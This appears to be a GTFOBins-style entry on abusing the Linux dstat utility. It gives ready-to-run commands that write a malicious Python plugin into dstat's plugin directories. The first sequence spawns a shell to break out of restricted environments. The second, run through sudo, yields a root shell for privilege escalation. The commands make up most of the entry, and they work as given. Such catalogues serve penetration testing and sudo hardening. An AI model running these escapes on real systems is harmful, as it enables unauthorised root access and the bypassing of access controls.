# GTFOBin: dstat

`dstat` allows you to run arbitrary `python` scripts loaded as “external plugins” if they are located in one of the directories stated in the `dstat` man page under “FILES”:

1. `~/.dstat/`
2. `(path of binary)/plugins/`
3. `/usr/share/dstat/`
4. `/usr/local/share/dstat/`

Pick the one that you can write into.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
mkdir -p ~/.dstat
echo 'import os; os.execv("/bin/sh", ["sh"])' >~/.dstat/dstat_xxx.py
dstat --xxx
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
sudo dstat --xxx
```